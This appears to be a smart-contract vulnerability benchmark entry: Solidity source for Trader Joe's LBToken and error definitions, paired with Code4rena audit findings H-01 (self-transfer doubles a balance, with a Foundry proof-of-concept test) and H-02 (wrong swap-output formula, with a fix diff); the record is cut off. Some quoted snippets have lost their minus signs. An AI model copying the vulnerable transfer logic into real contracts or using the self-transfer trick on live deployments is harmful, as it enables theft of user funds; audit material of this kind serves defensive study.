[
    {
        "Code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../../utils/introspection/IERC165.sol\";\n\n/**\n * @dev Required interface of an ERC1155 compliant contract, as defined in the\n * https://eips.ethereum.org/EIPS/eip-1155[EIP].\n *\n * _Available since v3.1._\n */\ninterface IERC1155 is IERC165 {\n    /**\n     * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.\n     */\n    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);\n\n    /**\n     * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all\n     * transfers.\n     */\n    event TransferBatch(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256[] ids,\n        uint256[] values\n    );\n\n    /**\n     * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to\n     * `approved`.\n     */\n    event ApprovalForAll(address indexed account, address indexed operator, bool approved);\n\n    /**\n     * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.\n     *\n     * If an {URI} event was emitted for `id`, the standard\n     * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value\n     * returned by {IERC1155MetadataURI-uri}.\n     */\n    event URI(string value, uint256 indexed id);\n\n    /**\n     * @dev Returns the amount of tokens of token type `id` owned by `account`.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function balanceOf(address account, uint256 id) external view returns (uint256);\n\n    /**\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {balanceOf}.\n     *\n     * Requirements:\n     *\n     * - `accounts` and `ids` must have the same length.\n     */\n    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory);\n\n    /**\n     * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,\n     *\n     * Emits an {ApprovalForAll} event.\n     *\n     * Requirements:\n     *\n     * - `operator` cannot be the caller.\n     */\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /**\n     * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.\n     *\n     * See {setApprovalForAll}.\n     */\n    function isApprovedForAll(address account, address operator) external view returns (bool);\n\n    /**\n     * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.\n     *\n     * Emits a {TransferSingle} event.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - If the caller is not `from`, it must have been approved to spend ``from``'s tokens via {setApprovalForAll}.\n     * - `from` must have a balance of tokens of type `id` of at least `amount`.\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the\n     * acceptance magic value.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes calldata data\n    ) external;\n\n    /**\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.\n     *\n     * Emits a {TransferBatch} event.\n     *\n     * Requirements:\n     *\n     * - `ids` and `amounts` must have the same length.\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the\n     * acceptance magic value.\n     */\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata amounts,\n        bytes calldata data\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"openzeppelin/utils/structs/EnumerableSet.sol\";\n\nimport \"./LBErrors.sol\";\nimport \"./interfaces/ILBToken.sol\";\n\n/// @title Liquidity Book Token\n/// @author Trader Joe\n/// @notice The LBToken is an implementation of a multi-token.\n/// It allows to create multi-ERC20 represented by their ids\ncontract LBToken is ILBToken {\n    using EnumerableSet for EnumerableSet.UintSet;\n\n    /// @dev Mapping from token id to account balances\n    mapping(uint256 => mapping(address => uint256)) private _balances;\n\n    /// @dev Mapping from account to spender approvals\n    mapping(address => mapping(address => bool)) private _spenderApprovals;\n\n    /// @dev Mapping from token id to total supplies\n    mapping(uint256 => uint256) private _totalSupplies;\n\n    /// @dev  Mapping from account to set of ids, where user currently have a non-zero balance\n    mapping(address => EnumerableSet.UintSet) private _userIds;\n\n    string private constant _name = \"Liquidity Book Token\";\n    string private constant _symbol = \"LBT\";\n\n    modifier checkApproval(address _from, address _spender) {\n        if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);\n        _;\n    }\n\n    modifier checkAddresses(address _from, address _to) {\n        if (_from == address(0) || _to == address(0)) revert LBToken__TransferFromOrToAddress0();\n        _;\n    }\n\n    modifier checkLength(uint256 _lengthA, uint256 _lengthB) {\n        if (_lengthA != _lengthB) revert LBToken__LengthMismatch(_lengthA, _lengthB);\n        _;\n    }\n\n    /// @notice Returns the name of the token\n    /// @return The name of the token\n    function name() public pure virtual override returns (string memory) {\n        return _name;\n    }\n\n    /// @notice Returns the symbol of the token, usually a shorter version of the name\n    /// @return The symbol of the token\n    function symbol() public pure virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /// @notice Returns the total supply of token of type `id`\n    /// @dev This is the amount of token of type `id` minted minus the amount burned\n    /// @param _id The token id\n    /// @return The total supply of that token id\n    function totalSupply(uint256 _id) public view virtual override returns (uint256) {\n        return _totalSupplies[_id];\n    }\n\n    /// @notice Returns the amount of tokens of type `id` owned by `_account`\n    /// @param _account The address of the owner\n    /// @param _id The token id\n    /// @return The amount of tokens of type `id` owned by `_account`\n    function balanceOf(address _account, uint256 _id) public view virtual override returns (uint256) {\n        return _balances[_id][_account];\n    }\n\n    /// @notice Return the balance of multiple (account/id) pairs\n    /// @param _accounts The addresses of the owners\n    /// @param _ids The token ids\n    /// @return batchBalances The balance for each (account, id) pair\n    function balanceOfBatch(address[] memory _accounts, uint256[] memory _ids)\n        public\n        view\n        virtual\n        override\n        checkLength(_accounts.length, _ids.length)\n        returns (uint256[] memory batchBalances)\n    {\n        batchBalances = new uint256[](_accounts.length);\n\n        unchecked {\n            for (uint256 i; i < _accounts.length; ++i) {\n                batchBalances[i] = balanceOf(_accounts[i], _ids[i]);\n            }\n        }\n    }\n\n    /// @notice Returns the type id at index `_index` where `account` has a non-zero balance\n    /// @param _account The address of the account\n    /// @param _index The position index\n    /// @return The `account` non-zero position at index `_index`\n    function userPositionAtIndex(address _account, uint256 _index) public view virtual override returns (uint256) {\n        return _userIds[_account].at(_index);\n    }\n\n    /// @notice Returns the number of non-zero balances of `account`\n    /// @param _account The address of the account\n    /// @return The number of non-zero balances of `account`\n    function userPositionNumber(address _account) public view virtual override returns (uint256) {\n        return _userIds[_account].length();\n    }\n\n    /// @notice Returns true if `spender` is approved to transfer `_account`'s tokens\n    /// @param _owner The address of the owner\n    /// @param _spender The address of the spender\n    /// @return True if `spender` is approved to transfer `_account`'s tokens\n    function isApprovedForAll(address _owner, address _spender) public view virtual override returns (bool) {\n        return _isApprovedForAll(_owner, _spender);\n    }\n\n    /// @notice Grants or revokes permission to `spender` to transfer the caller's tokens, according to `approved`\n    /// @param _spender The address of the spender\n    /// @param _approved The boolean value to grant or revoke permission\n    function setApprovalForAll(address _spender, bool _approved) public virtual override {\n        _setApprovalForAll(msg.sender, _spender, _approved);\n    }\n\n    /// @notice Transfers `_amount` token of type `_id` from `_from` to `_to`\n    /// @param _from The address of the owner of the token\n    /// @param _to The address of the recipient\n    /// @param _id The token id\n    /// @param _amount The amount to send\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {\n        address _spender = msg.sender;\n\n        _transfer(_from, _to, _id, _amount);\n\n        emit TransferSingle(_spender, _from, _to, _id, _amount);\n    }\n\n    /// @notice Batch transfers `_amount` tokens of type `_id` from `_from` to `_to`\n    /// @param _from The address of the owner of the tokens\n    /// @param _to The address of the recipient\n    /// @param _ids The list of token ids\n    /// @param _amounts The list of amounts to send\n    function safeBatchTransferFrom(\n        address _from,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _amounts\n    )\n        public\n        virtual\n        override\n        checkLength(_ids.length, _amounts.length)\n        checkAddresses(_from, _to)\n        checkApproval(_from, msg.sender)\n    {\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                _transfer(_from, _to, _ids[i], _amounts[i]);\n            }\n        }\n\n        emit TransferBatch(msg.sender, _from, _to, _ids, _amounts);\n    }\n\n    /// @notice Internal function to transfer `_amount` tokens of type `_id` from `_from` to `_to`\n    /// @param _from The address of the owner of the token\n    /// @param _to The address of the recipient\n    /// @param _id The token id\n    /// @param _amount The amount to send\n    function _transfer(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) internal virtual {\n        uint256 _fromBalance = _balances[_id][_from];\n        if (_fromBalance < _amount) revert LBToken__TransferExceedsBalance(_from, _id, _amount);\n\n        _beforeTokenTransfer(_from, _to, _id, _amount);\n\n        uint256 _toBalance = _balances[_id][_to];\n\n        unchecked {\n            _balances[_id][_from] = _fromBalance - _amount;\n            _balances[_id][_to] = _toBalance + _amount;\n        }\n\n        _remove(_from, _id, _fromBalance, _amount);\n        _add(_to, _id, _toBalance, _amount);\n    }\n\n    /// @dev Creates `_amount` tokens of type `_id`, and assigns them to `_account`\n    /// @param _account The address of the recipient\n    /// @param _id The token id\n    /// @param _amount The amount to mint\n    function _mint(\n        address _account,\n        uint256 _id,\n        uint256 _amount\n    ) internal virtual {\n        if (_account == address(0)) revert LBToken__MintToAddress0();\n\n        _beforeTokenTransfer(address(0), _account, _id, _amount);\n\n        _totalSupplies[_id] += _amount;\n\n        uint256 _accountBalance = _balances[_id][_account];\n        unchecked {\n            _balances[_id][_account] = _accountBalance + _amount;\n        }\n\n        _add(_account, _id, _accountBalance, _amount);\n\n        emit TransferSingle(msg.sender, address(0), _account, _id, _amount);\n    }\n\n    /// @dev Destroys `_amount` tokens of type `_id` from `_account`\n    /// @param _account The address of the owner\n    /// @param _id The token id\n    /// @param _amount The amount to destroy\n    function _burn(\n        address _account,\n        uint256 _id,\n        uint256 _amount\n    ) internal virtual {\n        if (_account == address(0)) revert LBToken__BurnFromAddress0();\n\n        uint256 _accountBalance = _balances[_id][_account];\n        if (_accountBalance < _amount) revert LBToken__BurnExceedsBalance(_account, _id, _amount);\n\n        _beforeTokenTransfer(address(0), _account, _id, _amount);\n\n        unchecked {\n            _balances[_id][_account] = _accountBalance - _amount;\n            _totalSupplies[_id] -= _amount;\n        }\n\n        _remove(_account, _id, _accountBalance, _amount);\n\n        emit TransferSingle(msg.sender, _account, address(0), _id, _amount);\n    }\n\n    /// @notice Grants or revokes permission to `spender` to transfer the caller's tokens, according to `approved`\n    /// @param _owner The address of the owner\n    /// @param _spender The address of the spender\n    /// @param _approved The boolean value to grant or revoke permission\n    function _setApprovalForAll(\n        address _owner,\n        address _spender,\n        bool _approved\n    ) internal virtual {\n        if (_owner == _spender) revert LBToken__SelfApproval(_owner);\n\n        _spenderApprovals[_owner][_spender] = _approved;\n        emit ApprovalForAll(_owner, _spender, _approved);\n    }\n\n    /// @notice Returns true if `spender` is approved to transfer `owner`'s tokens\n    /// or if `sender` is the `owner`\n    /// @param _owner The address of the owner\n    /// @param _spender The address of the spender\n    /// @return True if `spender` is approved to transfer `owner`'s tokens\n    function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {\n        return _owner == _spender || _spenderApprovals[_owner][_spender];\n    }\n\n    /// @notice Internal function to add an id to an user's set\n    /// @param _account The user's address\n    /// @param _id The id of the token\n    /// @param _accountBalance The user's balance\n    /// @param _amount The amount of tokens\n    function _add(\n        address _account,\n        uint256 _id,\n        uint256 _accountBalance,\n        uint256 _amount\n    ) internal {\n        if (_accountBalance == 0 && _amount != 0) {\n            _userIds[_account].add(_id);\n        }\n    }\n\n    /// @notice Internal function to remove an id from an user's set\n    /// @param _account The user's address\n    /// @param _id The id of the token\n    /// @param _accountBalance The user's balance\n    /// @param _amount The amount of tokens\n    function _remove(\n        address _account,\n        uint256 _id,\n        uint256 _accountBalance,\n        uint256 _amount\n    ) internal {\n        if (_accountBalance == _amount && _amount != 0) {\n            _userIds[_account].remove(_id);\n        }\n    }\n\n    /// @notice Hook that is called before any token transfer. This includes minting\n    /// and burning.\n    ///\n    /// Calling conditions (for each `id` and `amount` pair):\n    ///\n    /// - When `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n    /// of token type `id` will be  transferred to `to`.\n    /// - When `from` is zero, `amount` tokens of token type `id` will be minted\n    /// for `to`.\n    /// - when `to` is zero, `amount` of ``from``'s tokens of token type `id`\n    /// will be burned.\n    /// - `from` and `to` are never both zero.\n    /// @param from The address of the owner of the token\n    /// @param to The address of the recipient of the  token\n    /// @param id The id of the token\n    /// @param amount The amount of token of type `id`\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount\n    ) internal virtual {}\n}\n\n\n",
        "CodeNames": [
            "IERC1155.sol",
            "LBToken.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nFile: LBToken.sol\n176:     function _transfer(\n177:         address _from,\n178:         address _to,\n179:         uint256 _id,\n180:         uint256 _amount\n181:     ) internal virtual {\n182:         uint256 _fromBalance = _balances[_id][_from];\n...\n187:         uint256 _toBalance = _balances[_id][_to];\n188: \n189:         unchecked {\n190:             _balances[_id][_from] = _fromBalance _amount;\n191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt\n192:         }\n..\n196:     }\n",
                    "//solidity\nFile: LBToken.sol\n32:     modifier checkApproval(address _from, address _spender) {\n33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);\n34:         _;\n35:     }\n...\n131:     function safeTransferFrom(\n...\n136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {\n...\n269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {\n270:         return _owner == _spender || _spenderApprovals[_owner][_spender];\n271:     }\n",
                    "//solidity\n    function testSafeTransferFromOneself() public {\n        uint256 amountIn = 1e18;\n\n        (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);\n\n        uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);\n\n        assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding\n\n        pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself\n        uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance\n        assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one\n        assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding\n    }\n"
                ],
                "Type": " Transfering funds to yourself increases your balance",
                "Description": "*Submitted by Dravee(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299), also found by bitbopper(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/496), hansfriese(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/441), saian(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/422), Tutturu(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/391), JMukesh(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/288), __141345__(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/284), neumo(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/266), parashar(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/223), Randyyy(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/221), phaze(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/204), hxzy(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/128), Lambda(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/107), cccz(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/48), SEVEN(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/46), ne0n(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/20), 8olidity(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/12), and RaoulSchaffranek(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/8)*\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182<br\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187<br\n<https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192<br\n\nUsing temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that _toBalance can overwrite _fromBalance:\n\nsolidity\nFile: LBToken.sol\n176:     function _transfer(\n177:         address _from,\n178:         address _to,\n179:         uint256 _id,\n180:         uint256 _amount\n181:     ) internal virtual {\n182:         uint256 _fromBalance = _balances[_id][_from];\n...\n187:         uint256 _toBalance = _balances[_id][_to];\n188: \n189:         unchecked {\n190:             _balances[_id][_from] = _fromBalance _amount;\n191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt\n192:         }\n..\n196:     }\n\n\nFurthermore, the safeTransferFrom function has the checkApproval modifier which passes without any limit if _owner == _spender :\n\nsolidity\nFile: LBToken.sol\n32:     modifier checkApproval(address _from, address _spender) {\n33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);\n34:         _;\n35:     }\n...\n131:     function safeTransferFrom(\n...\n136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {\n...\n269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {\n270:         return _owner == _spender || _spenderApprovals[_owner][_spender];\n271:     }\n\n\n\nAdd the following test to LBToken.t.sol (run it with forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv):\n\nsolidity\n    function testSafeTransferFromOneself() public {\n        uint256 amountIn = 1e18;\n\n        (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);\n\n        uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);\n\n        assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding\n\n        pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself\n        uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance\n        assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one\n        assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding\n    }\n\n\nAs we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.\n\n",
                "Repair": "\n*   Add checks to make sure that _from != _to because that shouldn't be useful anyway\n*   Prefer the following:\n\nsolidity\nFile: LBToken.sol\n189:         unchecked {\n190:             _balances[_id][_from] -= _amount;\n191:             _balances[_id][_to] += _amount;\n192:         }\n\n\n0x0Louis (Trader Joe) confirmed(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299#issuecomment-1307892670):\n  The Warden has shown how, due to the improper usage of a supporting temporary variable, balance duplication can be achieved.\n \n Mitigation will require ensuring that the intended variable is changed in storage, and the code offered by the warden should help produce a test case to compare the fix against.\n \n Because the finding pertains to duplication of balances, causing a loss for users, I agree with High Severity.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./interfaces/ILBPair.sol\";\n\n/** LBRouter errors */\n\nerror LBRouter__SenderIsNotWAVAX();\nerror LBRouter__PairNotCreated(address tokenX, address tokenY, uint256 binStep);\nerror LBRouter__WrongAmounts(uint256 amount, uint256 reserve);\nerror LBRouter__SwapOverflows(uint256 id);\nerror LBRouter__BrokenSwapSafetyCheck();\nerror LBRouter__NotFactoryOwner();\nerror LBRouter__TooMuchTokensIn(uint256 excess);\nerror LBRouter__BinReserveOverflows(uint256 id);\nerror LBRouter__IdOverflows(int256 id);\nerror LBRouter__LengthsMismatch();\nerror LBRouter__WrongTokenOrder();\nerror LBRouter__IdSlippageCaught(uint256 activeIdDesired, uint256 idSlippage, uint256 activeId);\nerror LBRouter__AmountSlippageCaught(uint256 amountXMin, uint256 amountX, uint256 amountYMin, uint256 amountY);\nerror LBRouter__IdDesiredOverflows(uint256 idDesired, uint256 idSlippage);\nerror LBRouter__FailedToSendAVAX(address recipient, uint256 amount);\nerror LBRouter__DeadlineExceeded(uint256 deadline, uint256 currentTimestamp);\nerror LBRouter__AmountSlippageBPTooBig(uint256 amountSlippage);\nerror LBRouter__InsufficientAmountOut(uint256 amountOutMin, uint256 amountOut);\nerror LBRouter__MaxAmountInExceeded(uint256 amountInMax, uint256 amountIn);\nerror LBRouter__InvalidTokenPath(address wrongToken);\nerror LBRouter__InvalidVersion(uint256 version);\nerror LBRouter__WrongAvaxLiquidityParameters(\n    address tokenX,\n    address tokenY,\n    uint256 amountX,\n    uint256 amountY,\n    uint256 msgValue\n);\n\n/** LBToken errors */\n\nerror LBToken__SpenderNotApproved(address owner, address spender);\nerror LBToken__TransferFromOrToAddress0();\nerror LBToken__MintToAddress0();\nerror LBToken__BurnFromAddress0();\nerror LBToken__BurnExceedsBalance(address from, uint256 id, uint256 amount);\nerror LBToken__LengthMismatch(uint256 accountsLength, uint256 idsLength);\nerror LBToken__SelfApproval(address owner);\nerror LBToken__TransferExceedsBalance(address from, uint256 id, uint256 amount);\n\n/** LBFactory errors */\n\nerror LBFactory__IdenticalAddresses(IERC20 token);\nerror LBFactory__QuoteAssetNotWhitelisted(IERC20 quoteAsset);\nerror LBFactory__QuoteAssetAlreadyWhitelisted(IERC20 quoteAsset);\nerror LBFactory__AddressZero();\nerror LBFactory__LBPairAlreadyExists(IERC20 tokenX, IERC20 tokenY, uint256 _binStep);\nerror LBFactory__LBPairNotCreated(IERC20 tokenX, IERC20 tokenY, uint256 binStep);\nerror LBFactory__DecreasingPeriods(uint16 filterPeriod, uint16 decayPeriod);\nerror LBFactory__BaseFactorOverflows(uint16 baseFactor, uint256 max);\nerror LBFactory__ReductionFactorOverflows(uint16 reductionFactor, uint256 max);\nerror LBFactory__VariableFeeControlOverflows(uint16 variableFeeControl, uint256 max);\nerror LBFactory__BaseFeesBelowMin(uint256 baseFees, uint256 minBaseFees);\nerror LBFactory__FeesAboveMax(uint256 fees, uint256 maxFees);\nerror LBFactory__BinStepRequirementsBreached(uint256 lowerBound, uint16 binStep, uint256 higherBound);\nerror LBFactory__ProtocolShareOverflows(uint16 protocolShare, uint256 max);\nerror LBFactory__FunctionIsLockedForUsers(address user);\nerror LBFactory__FactoryLockIsAlreadyInTheSameState();\nerror LBFactory__LBPairIgnoredIsAlreadyInTheSameState();\nerror LBFactory__BinStepHasNoPreset(uint256 binStep);\nerror LBFactory__SameFeeRecipient(address feeRecipient);\nerror LBFactory__SameFlashLoanFee(uint256 flashLoanFee);\nerror LBFactory__LBPairSafetyCheckFailed(address LBPairImplementation);\nerror LBFactory__SameImplementation(address LBPairImplementation);\nerror LBFactory__ImplementationNotSet();\n\n/** LBPair errors */\n\nerror LBPair__InsufficientAmounts();\nerror LBPair__AddressZero();\nerror LBPair__BrokenSwapSafetyCheck();\nerror LBPair__CompositionFactorFlawed(uint256 id);\nerror LBPair__InsufficientLiquidityMinted(uint256 id);\nerror LBPair__InsufficientLiquidityBurned(uint256 id);\nerror LBPair__WrongLengths();\nerror LBPair__OnlyStrictlyIncreasingId();\nerror LBPair__OnlyFactory();\nerror LBPair__DistributionsOverflow();\nerror LBPair__OnlyFeeRecipient(address feeRecipient, address sender);\nerror LBPair__OracleNotEnoughSample();\nerror LBPair__FlashLoanCallbackFailed();\nerror LBPair__AlreadyInitialized();\nerror LBPair__NewSizeTooSmall(uint256 newSize, uint256 oracleSize);\n\n/** BinHelper errors */\n\nerror BinHelper__BinStepOverflows(uint256 bp);\nerror BinHelper__IdOverflows(int256 id);\nerror BinHelper__IntOverflows(uint256 id);\n\n/** FeeDistributionHelper errors */\n\nerror FeeDistributionHelper__FlashLoanUnderflow(uint256 expectedBalance, uint256 balance);\n\n/** Math128x128 errors */\n\nerror Math128x128__PowerUnderflow(uint256 x, int256 y);\nerror Math128x128__LogUnderflow();\n\n/** Math512Bits errors */\n\nerror Math512Bits__MulDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__ShiftDivOverflow(uint256 prod1, uint256 denominator);\nerror Math512Bits__MulShiftOverflow(uint256 prod1, uint256 offset);\nerror Math512Bits__OffsetOverflows(uint256 offset);\n\n/** Oracle errors */\n\nerror Oracle__AlreadyInitialized(uint256 _index);\nerror Oracle__LookUpTimestampTooOld(uint256 _minTimestamp, uint256 _lookUpTimestamp);\nerror Oracle__NotInitialized();\n\n/** PendingOwnable errors */\n\nerror PendingOwnable__NotOwner();\nerror PendingOwnable__NotPendingOwner();\nerror PendingOwnable__PendingOwnerAlreadySet();\nerror PendingOwnable__NoPendingOwner();\nerror PendingOwnable__AddressZero();\n\n/** ReentrancyGuardUpgradeable errors */\n\nerror ReentrancyGuardUpgradeable__ReentrantCall();\nerror ReentrancyGuardUpgradeable__AlreadyInitialized();\n\n/** SafeCast errors */\n\nerror SafeCast__Exceeds256Bits(uint256 x);\nerror SafeCast__Exceeds248Bits(uint256 x);\nerror SafeCast__Exceeds240Bits(uint256 x);\nerror SafeCast__Exceeds232Bits(uint256 x);\nerror SafeCast__Exceeds224Bits(uint256 x);\nerror SafeCast__Exceeds216Bits(uint256 x);\nerror SafeCast__Exceeds208Bits(uint256 x);\nerror SafeCast__Exceeds200Bits(uint256 x);\nerror SafeCast__Exceeds192Bits(uint256 x);\nerror SafeCast__Exceeds184Bits(uint256 x);\nerror SafeCast__Exceeds176Bits(uint256 x);\nerror SafeCast__Exceeds168Bits(uint256 x);\nerror SafeCast__Exceeds160Bits(uint256 x);\nerror SafeCast__Exceeds152Bits(uint256 x);\nerror SafeCast__Exceeds144Bits(uint256 x);\nerror SafeCast__Exceeds136Bits(uint256 x);\nerror SafeCast__Exceeds128Bits(uint256 x);\nerror SafeCast__Exceeds120Bits(uint256 x);\nerror SafeCast__Exceeds112Bits(uint256 x);\nerror SafeCast__Exceeds104Bits(uint256 x);\nerror SafeCast__Exceeds96Bits(uint256 x);\nerror SafeCast__Exceeds88Bits(uint256 x);\nerror SafeCast__Exceeds80Bits(uint256 x);\nerror SafeCast__Exceeds72Bits(uint256 x);\nerror SafeCast__Exceeds64Bits(uint256 x);\nerror SafeCast__Exceeds56Bits(uint256 x);\nerror SafeCast__Exceeds48Bits(uint256 x);\nerror SafeCast__Exceeds40Bits(uint256 x);\nerror SafeCast__Exceeds32Bits(uint256 x);\nerror SafeCast__Exceeds24Bits(uint256 x);\nerror SafeCast__Exceeds16Bits(uint256 x);\nerror SafeCast__Exceeds8Bits(uint256 x);\n\n/** TreeMath errors */\n\nerror TreeMath__ErrorDepthSearch();\n\n/** JoeLibrary errors */\n\nerror JoeLibrary__IdenticalAddresses();\nerror JoeLibrary__AddressZero();\nerror JoeLibrary__InsufficientAmount();\nerror JoeLibrary__InsufficientLiquidity();\n\n/** TokenHelper errors */\n\nerror TokenHelper__TransferFailed(IERC20 token, address recipient, uint256 amount);\n\n/** LBQuoter errors */\n\nerror LBQuoter_InvalidLength();\n\n\n",
        "CodeNames": [
            "LBErrors.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "//solidity\nif (_binStep == 0) {\n    (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n    if (_token < _tokenNext) {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve1 * (_balance _reserve0) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n    } else {\n        uint256 _balance = _token.balanceOf(_pair);\n        uint256 _amountOut = (_reserve0 * (_balance _reserve1) * 997) / (_balance * 1_000);\n\n        IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n    }\n} else {\n    ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);\n}\n",
                    "diff\n@@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {\n                     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();\n                     if (_token < _tokenNext) {\n                         uint256 _balance = _token.balanceOf(_pair);\n                       uint256 _amountOut = (_reserve1 * (_balance _reserve0) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance _reserve0) * 997;\n+                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(0, _amountOut, _recipient, \"\");\n                     } else {\n                         uint256 _balance = _token.balanceOf(_pair);\n                       uint256 _amountOut = (_reserve0 * (_balance _reserve1) * 997) / (_balance * 1_000);\n+                        uint256 amountInWithFee = (_balance _reserve1) * 997;\n+                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);\n\n                         IJoePair(_pair).swap(_amountOut, 0, _recipient, \"\");\n                     }\n",
